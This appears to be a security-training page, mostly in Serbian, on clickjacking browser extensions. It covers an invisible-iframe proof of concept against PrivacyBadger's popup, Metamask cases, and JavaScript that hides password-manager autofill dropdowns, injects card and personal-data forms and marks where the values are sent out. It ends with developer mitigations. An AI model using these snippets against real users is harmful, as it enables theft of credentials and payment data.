# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Ova stranica će iskoristiti ClickJacking ranjivost u ekstenziji pretraživača.\
Ako ne znate šta je ClickJacking pogledajte:


{{#ref}}
../clickjacking.md
{{#endref}}

Ekstenzije sadrže fajl **`manifest.json`**, i taj JSON fajl ima polje `web_accessible_resources`. Evo šta [the Chrome docs](https://developer.chrome.com/extensions/manifest/web_accessible_resources) kaže o tome:

> Ovi resursi bi potom bili dostupni na web stranici putem URL-a **`chrome-extension://[PACKAGE ID]/[PATH]`**, koji se može generisati pomoću **`extension.getURL method`**. Dozvoljeni resursi se poslužuju sa odgovarajućim CORS header-ima, tako da su dostupni putem mehanizama poput XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

**`web_accessible_resources`** u ekstenziji pretraživača nisu samo dostupni preko weba; oni takođe rade sa ugrađenim privilegijama ekstenzije. To znači da imaju mogućnost da:

- Promene stanje ekstenzije
- Učitaju dodatne resurse
- Interaguju sa pretraživačem u određenoj meri

Međutim, ova opcija predstavlja bezbednosni rizik. Ako resurs unutar **`web_accessible_resources`** ima bilo kakvu značajnu funkcionalnost, napadač bi potencijalno mogao da ugradi taj resurs u eksternu web stranicu. Nesvesni korisnici koji posete tu stranicu mogli bi nenamerno aktivirati ugrađeni resurs. Takva aktivacija može dovesti do neželjenih posledica, u zavisnosti od dozvola i mogućnosti resursa ekstenzije.

## PrivacyBadger Example

U ekstenziji PrivacyBadger, identifikovana je ranjivost vezana za to što je direktorijum `skin/` deklarisan kao `web_accessible_resources` na sledeći način (Check the original [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ova konfiguracija je dovela do potencijalnog bezbednosnog problema. Tačnije, fajl `skin/popup.html`, koji se renderuje prilikom interakcije sa PrivacyBadger ikonom u pregledaču, mogao je biti ugrađen unutar `iframe`. Takvo ugrađivanje moglo je biti iskorišćeno da prevari korisnike da nenamerno kliknu na "Disable PrivacyBadger for this Website". Takva radnja bi ugrozila privatnost korisnika onemogućavanjem PrivacyBadger zaštite i potencijalno izložila korisnika većem praćenju. Vizuelna demonstracija ovog eksploita može se pogledati u ClickJacking video primeru na [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Da bi se otklonila ova ranjivost, implementirano je jednostavno rešenje: uklanjanje `/skin/*` iz liste `web_accessible_resources`. Ova promena je efikasno umanjila rizik tako što je osigurala da sadržaj direktorijuma `skin/` ne može biti pristupljen ili manipulisan kroz `web_accessible_resources`.

Popravka je bila jednostavna: **uklonite `/skin/*` iz `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Primer

A [**blog post about a ClickJacking in metamask can be found here**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). U ovom slučaju, Metamask je zakrpio ranjivost proverom da li je protokol koji se koristi za pristup bio **`https:`** ili **`http:`** (na primer ne **`chrome:`**):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Another ClickJacking fixed** u Metamask extension-u je bio taj da su korisnici mogli da **Click to whitelist** kada je stranica bila sumnjiva da je phishing zbog `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. Pošto je ta stranica bila ranjiva na Clickjacking, napadač je mogao da je zloupotrebi prikazujući nešto normalno da bi žrtva kliknula da je whitelist-uje ne primećujući, a zatim se vratio na phishing stranicu koja će biti na whitelist-i.

## Steam Inventory Helper Primer

Pogledajte sledeću stranicu da vidite kako je **XSS** u browser extension bio povezan sa **ClickJacking** ranjivošću:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

Klasični extension clickjacking zloupotrebljava pogrešno konfigurisan `web_accessible_resources` da iframe-uje privilegovani HTML i navede korisničke klikove. Novi tip, DOM-based extension clickjacking, cilja autofill dropdowns koje password manageri ubacuju direktno u page DOM i koristi CSS/DOM trikove da ih sakrije ili prekriva dok ostaju klikabilni. Jedan prinudni klik može izabrati sačuvanu stavku i popuniti inpute pod kontrolom napadača osetljivim podacima.

### Threat model

- Napadač kontroliše web stranicu (ili postigne XSS/subdomain takeover/cache poisoning na povezanoj domeni).
- Žrtva ima instaliran i otključan password manager extension (neki izvršavaju autofill čak i kada su nominalno zaključani).
- Indukovan je bar jedan korisnički klik (overlay-ovani cookie baneri, dijalozi, CAPTCHAs, igre, itd.).

### Attack flow (manual autofill)

1. Inject an invisible but focusable form (login/PII/credit-card fields).
2. Focus an input to summon the extension’s autofill dropdown near the field.
3. Hide or occlude the extension UI while keeping it interactable.
4. Align a believable control under the hidden dropdown to coerce a click that selects an item.
5. Read filled values from the attacker form and exfiltrate.

### How to hide the autofill UI

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- Child unutar open ShadowRoot (dinamički tag, sakrij interni iframe):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- Roditeljski element
- BODY/HTML opacity trikovi da učine UI ekstenzije nevidljivim dok stranica izgleda normalno (npr. pozadina za snimak ekrana):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Overlay
- Partial overlay: zaklonite sve osim nekoliko piksela tako da dropdown ostane klikabilan (osigurajte da attacker overlay bude poslednji u DOM-u sa max z-index-om, ili koristite Top Layer).
- Full overlay: korišćenjem pointer-events:none tako da klikovi prolaze do skrivenog dropdown-a; održavajte ga stalnim pomoću Popover API-ja:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### Pozicioniranje klika žrtve

- Fiksno postavljanje: postavite skriveni padajući meni ispod verodostojne kontrole kao što su “Prihvati kolačiće”, “Zatvori”, ili CAPTCHA checkbox.
- Prati kursor: pomerajte fokusirano polje za unos ispod kursora tako da padajući meni prati kursor; periodično ponovo fokusirajte tako da jedan klik bilo gde izabere stavku:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Uticaj i scenariji

- Sajt pod kontrolom napadača: jedan prisiljeni klik može izvući podatke o kreditnoj kartici (broj/istek/CVC) i lične podatke (ime, email, telefon, adresa, DOB) koji nisu ograničeni na domen.
- Pouzdan sajt sa XSS/subdomain takeover/cache poisoning: višeklik krađa akreditiva (username/password) i TOTP, jer mnogi menadžeri rade autofill preko povezanih poddomena/nadređenih domena (npr., `*.example.com`).
- Passkeys: ako RP ne veže WebAuthn challenges za sesiju, XSS može presresti potpisanu tvrdnju; DOM-based clickjacking sakriva prompt za passkey da bi izazvao korisnikov potvrđujući klik.

### Ograničenja

- Zahteva bar jedan korisnički klik i pristojno poravnanje piksela (realistični overlay-i olakšavaju izazivanje klikova).
- Automatsko zaključavanje/odjava smanjuje prozore za eksploataciju; neki menadžeri i dalje rade autofill dok su “locked”.

### Mitigacije za developere ekstenzija

- Renderujte autofill UI u Top Layer (Popover API) ili na drugi način osigurajte da stoji iznad page stacking-a; izbegavajte da bude prekriveno overlay-ima koje kontroliše stranica.
- Oduprite se modifikacijama CSS-a: preferirajte Closed Shadow DOM i nadgledajte sa `MutationObserver` za sumnjive promene stilova na UI root-ovima.
- Detektujte neprijateljske overlay-e pre popunjavanja: nabrojte druge top-layer/popover elemente, privremeno onemogućite `pointer-events:none`, i koristite `elementsFromPoint()` da detektujete zaklanjanje; zatvorite UI ako overlay-i postoje.
- Detektujte sumnjive promene opacity ili stilova `<body>`/`<html>` i pre i posle renderovanja.
- Za probleme zasnovane na iframe: ograničite MV3 `web_accessible_resources` `matches` usko i izbegavajte izlaganje HTML UI; za neizbežan HTML, servirajte `X-Frame-Options: DENY` ili `Content-Security-Policy: frame-ancestors 'none'`.

## References

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
